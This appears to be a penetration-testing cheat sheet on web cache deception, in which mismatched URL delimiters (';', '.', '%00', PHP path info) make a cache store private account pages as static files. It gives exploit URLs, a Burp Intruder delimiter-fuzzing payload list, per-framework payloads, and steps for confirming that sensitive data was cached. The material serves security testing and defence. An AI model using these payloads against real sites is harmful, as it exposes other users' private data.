# Cache Deception — Delimiter Discrepancies

## When this applies

- Cache and origin use different URL delimiters.
- Java Spring uses `;` for matrix variables; Rails uses `.` for format; PHP allows `/` after `.php`.
- Goal: insert a delimiter that the cache ignores but the origin honors (or vice versa) so the URL appears static to the cache but dynamic to the origin.

## Technique

Send `/my-account;random.js`. Origin parses up to `;` and returns account data; cache sees full path ending in `.js` and caches as static.

## Steps

### Common delimiters

- `;` — Java Spring (matrix variables)
- `?` — Query string delimiter
- `#` — Fragment identifier
- `.` — Ruby on Rails format
- `%00` — Null byte

### Test payloads

```http
GET /my-account;test.js HTTP/1.1
GET /profile?data.css HTTP/1.1
```

### Exploit URLs

```
/my-account;unique.js
/api/user:data.css
/profile.format.json
```

### Pattern

```
Original:  /my-account
Exploit:   /my-account;unique.js
Result:    Origin stops at ;, cache ignores ;
```

### Discovering delimiters with Burp Intruder

**Position:** `/my-account§§abc`

**Payloads:**
```
! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~
%21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F
%3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E
```

**Look for:** `200 OK` responses

### Framework-specific payloads

**Java Spring:**
```
/my-account;matrix=variable.js
/api/user;param=value.css
```

**Ruby on Rails:**
```
/profile.format.json
/user.xml.js
```

**ASP.NET:**
```
/api/user/data.aspx;param.js
```

**Express.js (Node):**
```
/api/user?data=1.js
/profile#fragment.css
```

**PHP:**
```
/user.php/additional.js
/profile.php?id=1.css
```

### URL encoding reference (commonly needed)

```
Space  → %20
#      → %23
;      → %3B
?      → %3F
.      → %2E
/      → %2F
:      → %3A
```

## Verifying success

- First request returns sensitive data with `X-Cache: miss`.
- Second request to the SAME delimited URL returns `X-Cache: hit` with the same data.
- Origin treats `/foo;bar` as `/foo` (same response as plain `/foo`).

## Common pitfalls

- Browsers strip raw `#` (fragment) — always send as `%23`.
- Burp Intruder will URL-encode by default — disable encoding to test raw delimiters.
- Some caches normalize `;` away before the key — try `%3B` instead.

## Tools

- Burp Suite Intruder
- Burp Decoder (URL-encoding)
- Burp Web Cache Deception Scanner BApp
- curl
